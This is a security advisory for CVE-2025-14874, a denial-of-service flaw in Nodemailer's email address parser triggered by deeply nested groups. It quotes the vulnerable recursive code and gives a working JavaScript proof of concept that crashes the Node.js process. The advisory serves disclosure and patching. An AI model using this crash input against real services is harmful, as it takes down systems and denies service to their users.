# [H] Nodemailer’s addressparser is vulnerable to DoS caused by recursive calls

## Summary
Severity: High
Advisory: GHSA-rcmh-qjqh-p98v
CVE: CVE-2025-14874
CWE: CWE-703
Ecosystem: Maven, npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2025-12-01
Source: https://github.com/advisories/GHSA-rcmh-qjqh-p98v
Type: github-advisory

## Affected
- npm: `nodemailer` — affected >=3.0.0 <7.0.11
- Maven: `org.webjars.npm:nodemailer` — affected >=3.0.0

## Details
### Summary
A DoS can occur that immediately halts the system due to the use of an unsafe function.

### Details
According to **RFC 5322**, nested group structures (a group inside another group) are not allowed. Therefore, in lib/addressparser/index.js, the email address parser performs flattening when nested groups appear, since such input is likely to be abnormal. (If the address is valid, it is added as-is.) In other words, the parser flattens all nested groups and inserts them into the final group list.
However, the code implemented for this flattening process can be exploited by malicious input and triggers DoS

RFC 5322 uses a colon (:) to define a group, and commas (,) are used to separate members within a group.
At the following location in lib/addressparser/index.js:

https://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90

there is code that performs this flattening. The issue occurs when the email address parser attempts to process the following kind of malicious address header:

```g0: g1: g2: g3: ... gN: victim@example.com;```

Because no recursion depth limit is enforced, the parser repeatedly invokes itself in the pattern
`addressparser → _handleAddress → addressparser → ...`
for each nested group. As a result, when an attacker sends a header containing many colons, Nodemailer enters infinite recursion, eventually throwing Maximum call stack size exceeded and causing the process to terminate immediately. Due to the structure of this behavior, no authentication is required, and a single request is enough to shut down the service.

The problematic code section is as follows:
```js
if (isGroup) {
    ...
    if (data.group.length) {
        let parsedGroup = addressparser(data.group.join(',')); // <- boom!
        parsedGroup.forEach(member => {
            if (member.group) {
                groupMembers = groupMembers.concat(member.group);
            } else {
                groupMembers.push(member);
            }
        });
    }
}
```
`data.group` is expected to contain members separated by commas, but in the attacker’s payload the group contains colon `(:)` tokens. Because of this, the parser repeatedly triggers recursive calls for each colon, proportional to their number.

### PoC

```
const nodemailer = require('nodemailer');

function buildDeepGroup(depth) {
  let parts = [];
  for (let i = 0; i < depth; i++) {
    parts.push(`g${i}:`);
  }
  return parts.join(' ') + ' user@example.com;';
}

const DEPTH = 3000; // <- control depth 
const toHeader = buildDeepGroup(DEPTH);
console.log('to header length:', toHeader.length);

const transporter = nodemailer.createTransport({
  streamTransport: true,
  buffer: true,
  newline: 'unix'
});

console.log('parsing start');

transporter.sendMail(
  {
    from: 'test@example.com',
    to: toHeader,
    subject: 'test',
    text: 'test'
  },
  (err, info) => {
    if (err) {
      console.error('error:', err);
    } else {
      console.log('finished :', info && info.envelope);
    }
  }
);
```
As a result, when the colon is repeated beyond a certain threshold, the Node.js process terminates immediately.

### Impact
The attacker can achieve the following:

1. Force an immediate crash of any server/service that uses Nodemailer
2. Kill the backend process with a single web request
3. In environments using PM2/Forever, trigger a continuous restart loop, causing severe resource exhaustion”

## References
- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v
- https://nvd.nist.gov/vuln/detail/CVE-2025-14874
- https://github.com/nodemailer/nodemailer/commit/6218b8df
- https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150
- https://access.redhat.com/security/cve/CVE-2025-14874
- https://bugzilla.redhat.com/show_bug.cgi?id=2418133
- https://github.com/nodemailer/nodemailer
